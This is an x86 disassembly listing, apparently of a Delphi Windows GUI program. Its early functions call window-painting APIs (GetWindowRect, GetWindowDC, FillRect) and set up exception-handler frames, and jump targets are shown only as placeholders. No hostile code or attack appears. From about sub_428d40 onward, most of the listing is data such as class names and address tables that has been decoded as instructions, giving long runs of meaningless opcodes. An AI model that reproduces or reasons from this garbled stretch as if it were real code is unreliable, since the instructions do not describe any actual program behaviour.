add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404700
push eax
mov eax esi
call sub_4046f0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_427a68
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_427c74
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_427cf8
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_427d34
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_427d51 ]
jmp [ eax * 4 + jump_table_427dba ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4280c0
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42821b
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_427cf8
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_427b64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_4125c0
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_428248
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428283
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42828a
retn
mov eax [ rw-data ]
call sub_4030f8
mov eax rw-data
call sub_403eb4
sub_428d40
inc esp
leave
inc edx
add ah dh
enter 0x42 0xa8
leave
inc edx
add al ah
leave
inc edx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
inc esp
into
inc edx
add [ esi + ecx * 8 - 0x30ffffbe ] al
inc edx
add [ eax - 0x1fffbd32 ] bh
into
inc edx
add [ edi + ecx * 8 ] bh
inc edx
add [ edi + ecx * 8 + 0x42 ] dh
add al ch
int 0x42
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
dec esi
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
inc edx
add [ edx + eax ] ch
add [ eax ] al
sbb al 0x8c
inc edx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
outsd
jb r-xdata
jae r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc edx
add [ edx + ecx * 8 + 0x42 ] bh
add [ ecx + ecx * 8 + 0x42 ] al
add ah dh
enter 0x42 0xa8
leave
inc edx
add al ah
leave
inc edx
add [ ebp + edx * 8 - 0x2a0fffbe ] dl
inc edx
add [ eax + eax ] al
xchg [ eax ] eax
add [ eax ] 0xba
dec edx
[ eax - 0x33ffbd2a ]
salc
inc edx
add ah dl
salc
inc edx
add [ esi + edx * 8 ] ch
inc edx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pushad
aam 0x42
add ah al
aam 0x42
add [ esp + ecx * 8 + 0x42 ] al
add al cl
xchg [ ebx ] eax
int3
add [ eax - 0x2fffbc43 ] ch
inc eax
add [ eax ] dh
aam 0x42
jpe r-xdata
xor [ eax ] al
xor ah dl
jb r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + ebp * 2 - 0x74 ] 0x122c0042
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc eax
add [ eax + esi - 0x2bcfffc0 ] ch
je r-xdata
test [ ebx ] eax
sub al 0x40
inc ecx
add [ esi + edx * 8 ] dh
inc edx
add [ eax + 0x3f ] ah
inc ebx
add al dl
outsb
je r-xdata
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
insb
jae r-xdata
insb
jae r-xdata
inc edx
add [ edx + ecx * 8 + 0x42 ] bh
add [ ecx + ecx * 8 + 0x42 ] al
add ah dh
enter 0x42 0xa8
leave
inc edx
add al ah
leave
inc edx
add [ ebp + edx * 8 - 0x2a0fffbe ] dl
inc edx
add [ 0x6d654d54 ] al
outsd
mov eax eax
cld
nop
inc edx
add [ edi ] al
add eax 0x6d654d54
outsd
add [ eax - 0x7073ffbe ] dl
inc edx
add [ ebx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pushad
aam 0x42
add ah al
aam 0x42
add [ esp + ecx * 8 + 0x42 ] al
add al cl
xchg [ ebx ] eax
int3
inc edx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
nop
xor [ eax ] al
lodsb [ esi ]
insd
dec ebp
insd
outsd
mov eax eax
nop
pop [ edx ]
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc edx
add [ eax + esi - 0x2bcfffc0 ] ch
insb
or dh [ ebx + 0x73 ]
push esi
aas
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
shl [ esi + ecx * 4 + 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
pop [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ fs : edx ]
jle r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x4b3b0100 ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov ah 0x43
call 0x142d54a
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ esi + edx * 8 ] dh
inc edx
outsd
insd
dec ebp
insd
outsd
je r-xdata
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax - 0x43ffbd2d ] ah
mov eax 0xbdd80043
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ edi + eax * 8 + 0x3e980042 ] dl
inc ebx
add ah ch
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
inc ecx
lea eax [ edx ]
add ecx [ esp + edx * 2 ]
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ 0x6c410900 ] cl
imul esp [ edi + 0x6e ] 0x746e656d
enter 0x42fe 0x0
popad
add [ eax ] al
jmp esp
add [ eax + 0x5b0042f7 ] ah
add [ eax ] al
jmp [ edi + edi + 0x10043 ]
nop
inc ebx
add [ eax - 0x3c ] bh
inc ebx
add [ eax ] ah
scasd [ edi ]
inc ebx
add [ eax ] dl
mov dl 0x43
add [ edi + eax * 8 + 0x42 ] dh
add [ ecx + ecx * 8 ] dl
inc edx
add al dl
enter 0x42 0x7c
0x42
inc edx
add [ eax + 0xc00428d ] dl
add [ eax ] cl
push ebx
je r-xdata
xor eax [ eax ]
or al 0xce
inc edx
add [ eax - 0x53ffbfd0 ] dl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bl
lea eax [ edx ]
push es
add bh bh
adc eax 0x6f430500
insb
outsd
insb
dec edi
jne r-xdata
add [ eax ] eax
or eax 0x1630043
add bh bh
movsb [ edi ] [ esi ]
mov edi 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
inc ebx
je r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
inc [ edx ]
je r-xdata
outsd
jb r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8065646f
cwde
inc esp
add [ edx + eax ] cl
add bh bh
test al 0xc7
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
add [ esp + 0x41 ] ch
add [ eax - 0x43ffbd2d ] ah
mov eax 0xbdd80043
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ edi + eax * 8 + 0x3e980042 ] dl
inc ebx
add ah ch
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
dec esp
mov eax [ 0xffffffffa1440041 ]
inc ecx
insb
jae r-xdata
add bh bh
jl r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
inc edx
jbe r-xdata
push cs
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
adc [ edi ] 0x0
add eax 0x336c7443
inc esp
mov bh dh
jb r-xdata
push cs
inc ebx
add [ ebp + 0x1 ] ah
add bh bh
sbb al al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
xor [ eax ] al
xor ah dl
add [ ebx + 0x429000c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
nop
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
nop
inc edx
add [ eax ] dh
add al [ eax ]
add [ eax ] ch
mov es [ edx ]
dec esp
movsb [ edi ] [ esi ]
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or al 0xce
inc edx
add [ eax - 0x53ffbfd0 ] dl
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0016 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
int3
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x2f00ffff ] ah
add dh bh
mov ah 0x4b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
mov bl 0x43
add ah dh
mov bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050017 ] al
je r-xdata
je r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] sub_430d5c
add [ fs : eax ] eax
jmp [ edi + edi * 4 + 0x10043 ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
push 0x43
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ edi + 0x680041 ] dh
add [ gs : eax ] dl
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ eax + ecx * 4 - 0x9 ]
outsd
outsb
je r-xdata
inc [ ebx + ecx * 2 + 0x4b940043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
jae r-xdata
add [ eax ] al
xor ah 0xff
jb r-xdata
insb
call 0x7042d411
add [ eax ] al
push [ eax ]
dec esp
inc ebx
add [ esp + ecx * 2 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ 0x15ff0000 ] 0x0
add eax 0x6f6c6f43
add bh bh
test [ ebx + 0x43 ] cl
add [ ebx + ecx * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al 0x0
add al 0x46
jb r-xdata
inc edx
add [ ebp ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc [ edx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
sub_429126
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add eax 0x67696c41
outsb
cmp [ esi ] cl
inc ecx
add [ edx + eax ] ah
add bh bh
dec esp
salc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
enter 0x42fe 0x0
popad
add [ eax ] al
jmp esp
sub_42995a
inc ecx
add [ ebp - 0x5a27ffbf ] al
inc ecx
add al ah
cmp [ ebx ] al
sbb al 0xd7
inc edx
add [ ecx + edi + 0x43 ] dl
add ah ah
or eax 0x6fac0044
inc ebx
add ah cl
cmp al [ ebx ]
mov [ ecx ] bh
inc ebx
add [ esi + ecx ] dh
inc esp
add [ eax + 0xe ] cl
inc esp
add al al
cmp [ ebx ] eax
jo r-xdata
or [ esi ] 0x44
add [ edi + ebp * 2 + 0x3b300043 ] dh
inc ebx
add [ eax + 0x3b ] dh
inc esp
add [ edx + edi ] bl
inc ebx
add [ edi + edx * 8 + 0x42 ] dl
add [ edx + edi ] bh
inc ebx
add [ eax - 0x4bffbbf2 ] al
outsd
inc ebx
add [ eax ] dh
cmp eax [ ebx ]
jo r-xdata
dec eax
je r-xdata
fwait
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
0x9b0a0042 0x42
or al 0x2
add [ eax ] al
js r-xdata
inc ebx
add [ edx + edi + 0x43 ] bl
add [ esi + ecx + 0xe980044 ] dl
inc esp
add [ eax - 0xfffbcc6 ] al
aaa
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
cmp [ ebp - 0x10ffec ] bh
fcos
cld
fadd [ edx ]
dec eax
fld [ edx ]
or al 0xd8
inc edx
add [ eax + ebx * 8 + 0x42 ] dl
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
je r-xdata
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax - 0x43ffbd29 ] bh
mov eax 0xbdd80043
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ eax + 0x48 ] bh
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x9a20c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cmp al 0x33
inc eax
add [ eax ] cl
mov es [ ebx ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
loopne r-xdata
inc ebx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
add [ eax ] cl
mov es [ ebx ]
nop
je r-xdata
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
inc edx
add [ eax ] bl
test [ ebx ] al
dec eax
add [ ebx ] 0xc8
xchg [ ebx ] eax
int3
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
inc ebx
add [ eax - 0x2fffbc43 ] ch
cmp al 0x33
inc eax
outsb
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
rcr dl 0x42
add [ eax ] bl
test [ ebx ] al
cld
fiadd [ edx ]
enter 0x4387 0x0
int3
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
loopne r-xdata
outsd
insb
lea eax [ eax ]
and [ ebx + 0xe070042 ] bl
push esp
inc edx
jne r-xdata
dec eax
[ eax ]
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
inc ebx
add [ eax + eax * 2 ] ch
je r-xdata
test [ ebx ] eax
sub al 0x40
add al dl
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
imul eax [ fs : ebx ] 0x60
aas
outsd
insb
and [ edx + 0x122c0042 ] bl
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add [ eax + 0x3f ] ah
inc ebx
inc ebx
je r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ ecx + ebx * 8 - 0x4743ffbe ] ch
inc ebx
add al bl
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
insb
jae r-xdata
add [ ebp - 0x646bffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x429c ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] ch
inc edx
add [ edx + 0x1800429c ] bl
add al [ eax ]
add ah dl
cdq
inc edx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
sub_42a1b1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
push ebp
outsb
push ebp
jo r-xdata
inc ebx
add [ eax + eax * 2 ] ch
jns r-xdata
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
dec ebx
jns r-xdata
add al 0x43
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
inc edx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
in al 0xde
inc edx
add al bh
fiadd [ edx ]
add bh bl
inc edx
add [ edi + ebx * 8 - 0x223fffbe ] bl
inc edx
add [ ebp + ebx * 8 + 0x42 ] dl
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pop esp
fiadd [ edx ]
sbb [ ebx + eax * 2 + 0x42deb800 ] al
add al cl
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
imul eax [ fs : ebx ] 0x60
aas
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
loopne r-xdata
jo r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x2180042 ] ah
